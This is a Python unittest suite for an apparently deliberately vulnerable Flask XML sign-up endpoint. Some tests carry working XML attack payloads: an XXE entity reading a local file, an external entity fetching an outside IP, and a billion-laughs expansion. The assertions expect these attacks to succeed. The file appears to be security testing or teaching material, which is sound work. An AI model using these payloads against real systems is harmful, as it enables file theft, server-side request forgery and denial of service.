import unittest
from app import app,add_user,User
import requests as re
class TestAddUser(unittest.TestCase):
    def setUp(self):
        # Create a Flask test client
        self.client = app.test_client()
    def test_add_user_already_exist(self):
        # Send a POST request to the /user endpoint with valid XML data
        xml_data = """
        
        <root>
            <password>John</password>
            <name>xxe;</name>
            <email>assbhjbvjhbjhhgss</email>
        </root>
        """
        response = self.client.post('http://127.0.0.1:5000/user', data=xml_data, content_type='application/xml')

        # Assert that the response has a 200 status code
        self.assertEqual(response.status_code, 200)

        # Assert that the response contains the correct XML data
        # expected_xml = """
        # '<?xml version="1.0" encoding="UTF-8" ?><root><message type="str">John created</message></root>'
        # """
        expected_xml="""<?xml version="1.0" encoding="UTF-8" ?><root><message type="str">Email already exists</message></root>"""
        # print("this is responsedata",response.data)
        # print("expected xml is ",expected_xml)
        response_data_str = response.data.decode('utf-8')
        self.assertEqual(response_data_str, expected_xml)

    def test_add_user_missing_name(self):
        # Send a POST request to the /user endpoint with XML data that is missing the name element
        xml_data = """
        <user>
            <password>password123</password>
            <email>john@example.com</email>
        </user>
        """
        response = self.client.post('/user', data=xml_data, content_type='application/xml')

        # Assert that the response has a 400 status code
        self.assertEqual(response.status_code, 200)

        # Assert that the response contains the correct XML data
        expected_xml = """<?xml version="1.0" encoding="UTF-8" ?><root><message type="str">Name, password and email are required</message></root>"""
        #print("expected xml is for no name ",expected_xml)
        response_data_str = response.data.decode('utf-8')
        #print("this is responsedata for no name ",response_data_str)
        self.assertEqual(response_data_str, expected_xml)

    # def test_add_user_invalid_xml(self):
    #     # Send a POST request to the /user endpoint with invalid XML data
    #     xml_data = """
    #     <user>
    #         <name>John</name>
    #         <password>password123</password>
    #         <email>john@example.com</email>
    #     """
    #     response = self.client.post('/user', data=xml_data, content_type='application/xml')

    #     # Assert that the response has a 400 status code
    #     self.assertEqual(response.status_code, 500)


    #     # Assert that the response contains the correct XML data
    #     expected_xml = """
    #     <response>
    #         <message>Invalid XML</message>
    #     </response>
    #     """
    #     response_data_str = response.data.decode('utf-8')
    #     print("expected xml is for wrong type xml ",expected_xml)
    #     #response_data_str = response.data.decode('utf-8')
    #     print("this is responsedata for wrong type xml ",response_data_str)
    #     self.assertEqual(response_data_str, expected_xml)
    #     self.assertEqual(response_data_str, expected_xml)

    def test_add_user_already_exist(self):
        # Send a POST request to the /user endpoint with valid XML data
        xml_data = """
        
        <root>
            <password>John</password>
            <name>xxe;</name>
            <email>abvjsdngss</email>
        </root>
        """
        response = self.client.post('http://127.0.0.1:5000/user', data=xml_data, content_type='application/xml')

        # Assert that the response has a 200 status code
        self.assertEqual(response.status_code, 200)

        # Assert that the response contains the correct XML data
        # expected_xml = """
        # '<?xml version="1.0" encoding="UTF-8" ?><root><message type="str">John created</message></root>'
        # """
        expected_xml="""<?xml version="1.0" encoding="UTF-8" ?><root><message type="str">Email already exists</message></root>"""
        # print("this is responsedata",response.data)
        # print("expected xml is ",expected_xml)
        response_data_str = response.data.decode('utf-8')
        self.assertEqual(response_data_str, expected_xml)
    def test_add_user_read_file(self):
        # Send a POST request to the /user endpoint with valid XML data
        xml_data = """
        
        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///C:/Users/USER/Desktop/a.txt"> ]>
        <root>
        <password>emsassacszdil5</password>
        <name>&xxe;</name>
        <email>assxkzkm sdmv dmdmkj</email>
        </root>
        """
        response = self.client.post('http://127.0.0.1:5000/user', data=xml_data, content_type='application/xml')

        # Assert that the response has a 200 status code
        self.assertEqual(response.status_code, 200)

        # Assert that the response contains the correct XML data
        # expected_xml = """
        # '<?xml version="1.0" encoding="UTF-8" ?><root><message type="str">John created</message></root>'
        # """
        expected_xml="""<?xml version="1.0" encoding="UTF-8" ?><root><message type="str">You should not be reading this created</message></root>"""
        # print("this is responsedata for reading a file",response.data)
        # print("expected xml is for reading a file",expected_xml)
        response_data_str = response.data.decode('utf-8')
        self.assertEqual(response_data_str, expected_xml)
    def test_add_user_read_link(self):
        # Send a POST request to the /user endpoint with valid XML data
        xml_data = """
        
        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://174.129.167.65/"> ]>
        <signup><name>&xxe;</name><email>alsvmzcmdz 
        kfdmvmgfkaa</email><password>456654123</password></signup>
        """
        response = self.client.post('http://127.0.0.1:5000/user', data=xml_data, content_type='application/xml')

        # Assert that the response has a 200 status code
        self.assertEqual(response.status_code, 200)

        # Assert that the response contains the correct XML data
        # expected_xml = """
        # '<?xml version="1.0" encoding="UTF-8" ?><root><message type="str">John created</message></root>'
        # """
        expected_xml="""<?xml version="1.0" encoding="UTF-8" ?><root><message type="str">27058\n created</message></root>"""
        # print("this is responsedata for reading a link",response.data)
        # print("expected xml is for reading a link",expected_xml)
        response_data_str = response.data.decode('utf-8')
        self.assertEqual(response_data_str, expected_xml)
    def test_add_user_billioan_laughs_attack(self):
        # Send a POST request to the /user endpoint with valid XML data
        xml_data = """
        
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ELEMENT lolz (#PCDATA)>
        <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
        <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
        <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
        <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
        <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <signup><name>&lol9;</name><email>aaaaaaaaaaacdcsdaa</email><password>456654123</password></signup>"""
        response = self.client.post('http://127.0.0.1:5000/user', data=xml_data, content_type='application/xml')

        # Assert that the response has a 200 status code
        self.assertEqual(response.status_code, 500)

        # Assert that the response contains the correct XML data
        # expected_xml = """
        # '<?xml version="1.0" encoding="UTF-8" ?><root><message type="str">John created</message></root>'
        # """
        expected_xml="""<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"""
        # print("this is responsedata for billion laughs",response.data)
        # print("expected xml is for reading a for billion laughs",expected_xml)
        response_data_str = response.data.decode('utf-8')
        self.assertEqual(response_data_str, expected_xml)
        
    
if __name__ == '__main__':
    unittest.main()
